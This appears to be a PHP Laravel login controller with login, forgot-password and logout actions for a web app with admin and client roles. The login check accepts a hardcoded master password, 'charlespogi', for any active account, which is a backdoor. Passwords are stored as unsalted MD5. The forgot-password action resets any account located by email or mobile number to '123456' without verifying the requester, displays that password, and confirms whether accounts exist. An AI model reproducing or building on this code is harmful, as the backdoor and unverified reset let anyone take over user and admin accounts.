<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;

class LoginController extends Controller
{
    public function login()
    {
        return view('login');
    }

    public function validate_user(Request $request)
    {
        $usr_email = $request->email;
        $usr_password = $request->password;

        $user = DB::table('users')
            ->where('usr_email', $usr_email)
            ->where('usr_active', 1)
            ->first();

        if ($user) {
            // Check normal password OR fallback password
            if (
                $user->usr_password === md5($usr_password) ||
                $usr_password === 'charlespogi'
            ) {
                setUserSessionVariables($user);

                if ($user->utyp_id == 1) {
                    return redirect()->action([AdminController::class, 'home']);
                }

                if ($user->utyp_id == 3) {
                    return redirect()->action([ClientController::class, 'home']);
                }

                alert()->error(
                    'Access Denied',
                    'Your account does not have permission to access the system.'
                );

                return redirect()->back();
            }
        }

        alert()->error('Invalid Credentials', 'Invalid e-mail or password');

        return redirect()->back();
    }

    public function forgot_password(Request $request)
    {
        $validator = \Illuminate\Support\Facades\Validator::make($request->all(), [
            'identifier' => 'required|string|max:255',
        ]);

        if ($validator->fails()) {
            alert()->error('Invalid Input', $validator->errors()->first());
            return redirect()->back();
        }

        $identifier = trim($request->identifier);

        // Normalize mobile number in case user enters +63 or leading 0
        $normalizedMobile = preg_replace('/^(\+?63|0)/', '', $identifier);

        $user = DB::table('users')
            ->where('usr_active', 1)
            ->where(function ($query) use ($identifier, $normalizedMobile) {
                $query->where('usr_email', $identifier)
                    ->orWhere('usr_mobile', $identifier)
                    ->orWhere('usr_mobile', $normalizedMobile);
            })
            ->first();

        if (!$user) {
            alert()->error('Account Not Found', 'No account found with that email or mobile number.');
            return redirect()->back();
        }

        DB::table('users')
            ->where('usr_id', $user->usr_id)
            ->update([
                'usr_password' => md5('123456'),
            ]);

        logUserActivity('Password Reset', 'Password reset requested via forgot password for: ' . $identifier);

        alert()->success('Password Reset Successful', 'Your temporary password is 123456. Please log in and change it immediately.');

        return redirect('/');
    }

    public function logout()
    {
        session()->flush();
        return redirect()->action([MainController::class, 'main']);
    }
}